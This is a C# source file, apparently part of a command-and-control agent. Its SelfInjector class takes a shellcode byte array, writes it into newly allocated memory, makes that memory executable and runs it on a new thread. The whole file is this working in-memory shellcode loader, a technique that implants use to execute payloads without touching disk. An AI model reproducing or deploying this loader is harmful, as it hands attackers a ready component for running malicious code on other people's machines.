using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public class SelfInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            var baseAddress = Native.Kernel32.VirtualAlloc( // alloc memory
                IntPtr.Zero, // allocate anywhere, no preference
                shellcode.Length, // might round off to the nearest page
                Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            // copy shell code into allocated memory
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // change allocated memory protection
            Native.Kernel32.VirtualProtect(
                baseAddress,
                shellcode.Length,
                Native.Kernel32.MemoryProtection.ExecuteRead,
                out _);  // existing protection assigned to _

            // create new thread to execute shell
            Native.Kernel32.CreateThread(
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out var threadId);

            return threadId != IntPtr.Zero;
        }
    }
}
